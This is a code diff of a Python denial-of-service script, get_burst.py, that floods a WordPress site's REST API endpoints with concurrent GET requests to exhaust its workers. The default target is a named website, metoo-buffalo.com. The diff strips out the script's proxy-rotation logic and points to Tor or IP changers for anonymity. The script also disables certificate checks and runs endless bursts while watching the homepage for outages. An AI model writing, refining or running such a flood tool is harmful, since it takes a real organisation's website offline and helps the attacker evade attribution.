@@ -2,24 +2,20 @@
 """
 get_burst.py — WordPress REST API GET flood / worker exhaustion.
 Rotates across 6 expensive REST endpoints (posts, media, comments).
-Uses make_pool() — auto-detects Tor > Webshare > file proxies.
+No proxy logic — use torify / ipchanger at system level.
 """
 
-import requests, threading, itertools, time, sys, urllib3, argparse, os
+import requests, threading, itertools, time, urllib3, argparse
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
-from proxy_pool import make_pool
 
 G="\033[0;32m"; R="\033[0;31m"; Y="\033[0;33m"; C="\033[0;36m"; W="\033[0m"; B="\033[1m"
-
-SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 
 ap = argparse.ArgumentParser()
 ap.add_argument("--target",      default="metoo-buffalo.com")
 ap.add_argument("--concurrency", type=int, default=30)
 ap.add_argument("--timeout",     type=int, default=20)
-ap.add_argument("--proxy-file",  default=os.path.join(SCRIPT_DIR, "proxies.txt"))
 ap.add_argument("--bursts",      type=int, default=0, help="0 = infinite")
 args = ap.parse_args()
 
@@ -44,24 +40,19 @@ HEADERS = {
     "Referer":           BASE + "/",
 }
 
-pool    = make_pool(args.proxy_file)
-ep_lock = threading.Lock()
+ep_lock  = threading.Lock()
 ep_cycle = itertools.cycle(ENDPOINTS)
 
 def next_endpoint():
     with ep_lock: return next(ep_cycle)
 
-def fire(req_num):
-    url   = next_endpoint()
-    proxy = pool.next(slot=req_num)
-    proxies = {"http": proxy, "https": proxy} if proxy else {}
-    t0 = time.time()
+def fire(_):
+    url = next_endpoint()
+    t0  = time.time()
     try:
-        r = requests.get(url, headers=HEADERS, proxies=proxies,
-                         timeout=args.timeout, verify=False)
+        r = requests.get(url, headers=HEADERS, timeout=args.timeout, verify=False)
         return r.status_code, time.time() - t0
     except Exception:
-        pool.mark_dead(proxy)
         return 0, time.time() - t0
 
 # homepage monitor
@@ -91,7 +82,6 @@ print(f"{'='*68}")
 print(f"  Target      : {BASE}")
 print(f"  Endpoints   : {len(ENDPOINTS)} rotating (posts/media/comments)")
 print(f"  Concurrency : {args.concurrency}")
-print(f"  Proxy       : {type(pool).__name__} ({pool.alive()} alive)")
 print(f"  Mode        : Continuous until Ctrl+C")
 print(f"{B}{'='*68}{W}\n")
 print(f"  {'BURST':<6} {'TIME':<9} {'200':>4} {'403':>4} {'429':>4} {'503':>4} {'ERR':>4} {'AVG':>7}  STATUS")
@@ -125,7 +115,6 @@ try:
         print(f"  {C}[{burst:>4}]{W} {ts}  {c200:>4} {c403:>4} {c429:>4} "
               f"{R if c503 else W}{c503:>4}{W} {cerr:>4} {avg:>6.2f}s  {st}  │ {mon_str}")
 
-        pool.maybe_refresh()
 
 except KeyboardInterrupt:
     pass
